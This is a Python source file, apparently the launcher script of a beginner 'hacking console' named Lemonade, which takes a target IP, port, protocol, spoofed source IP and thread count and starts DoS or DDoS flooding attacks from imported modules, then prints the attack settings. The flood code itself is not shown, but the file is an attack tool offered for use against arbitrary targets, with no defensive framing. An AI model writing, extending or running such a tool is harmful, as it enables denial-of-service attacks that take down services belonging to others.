from ddos_copy import Ddos
from dos_copy import Dos
import argparse
from colorama import init, Fore, Back, Style

parser = argparse.ArgumentParser(description = "Lemonade is a simple hacking console with cool features for begginer hackers! made by pastlecry#8645")

parser.add_argument('--SCRIPT', '--S', type = str, help = 'Attack Script', required = True)
parser.add_argument('--TARGET', '--T', type = str, help = 'Target IP', required = True)
parser.add_argument('--PORT', '--P', type = str, default = 'auto', help = 'Port')
parser.add_argument('--PROTOCOL', '--O', type = str, default = 'UDP', help = 'Transport protocol', choices = ['UDP', 'TCP'])
parser.add_argument('--FAKEIP', '--F', type = str, default = '182.123.16.28', help = 'Fake IP')
parser.add_argument('--TIMESLEEP', '--TS', type = int, default = '1', help = 'Time sleep')
parser.add_argument('--THREADING', '--H', type = int, default = '500', help = 'Threading')
parser.add_argument('--INFORMATION', '--I', help = 'Threading', action = 'store_true')
parser.add_argument('--AINFORMATION', '--AI', help = 'Threading', action = 'store_true')

arguments = parser.parse_args()

ip = arguments.TARGET
fake_ip = arguments.FAKEIP
porty = arguments.PORT
protocol = arguments.PROTOCOL
s_t = arguments.TIMESLEEP
threading_count = arguments.THREADING

if arguments.SCRIPT == "ddos":
    attack = Ddos(ip, porty, protocol, fake_ip, s_t, threading_count)
    attack.ddos(ip, porty, protocol, fake_ip, s_t, threading_count)

elif arguments.SCRIPT == "dos":
    attack = Dos(ip, porty, protocol, threading_count)
    attack.dos(ip, porty, protocol, threading_count)

if arguments.INFORMATION:
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print("\n")
    print(Style.BRIGHT + Fore.RED + "Target ip : " + Style.BRIGHT + Fore.WHITE + ip)
    print(Style.BRIGHT + Fore.GREEN + "Port : " + Style.BRIGHT + Fore.WHITE + porty)
    print(Style.BRIGHT + Fore.YELLOW + "protocol : " + Style.BRIGHT + Fore.WHITE + protocol)
    print(Style.BRIGHT + Fore.CYAN + " Threading : " + Style.BRIGHT + Fore.WHITE + str(threading_count))
    print("\n")
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
  
if arguments.AINFORMATION:
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")
    print("\n")
    print(Style.BRIGHT + Fore.RED + " Target ip : " + Style.BRIGHT + Fore.WHITE + ip)
    print(Style.BRIGHT + Fore.GREEN + " Port : " + Style.BRIGHT + Fore.WHITE + porty)
    print(Style.BRIGHT + Fore.YELLOW + " protocol : " + Style.BRIGHT + Fore.WHITE + protocol)
    print(Style.BRIGHT + Fore.CYAN + " Threading : " + Style.BRIGHT + Fore.WHITE + str(threading_count))
    if arguments.SCRIPT == "ddos":
      print(Style.BRIGHT + Fore.BLUE + " Fake ip : " + Style.BRIGHT + Fore.WHITE + fake_ip)
      print(Style.BRIGHT + Fore.MAGENTA + " Sleep time : " + Style.BRIGHT + Fore.WHITE + str(s_t))
      print("\n")
    print("░░░░░░░░░░░░░░░░░░░░░░░░░░░░░")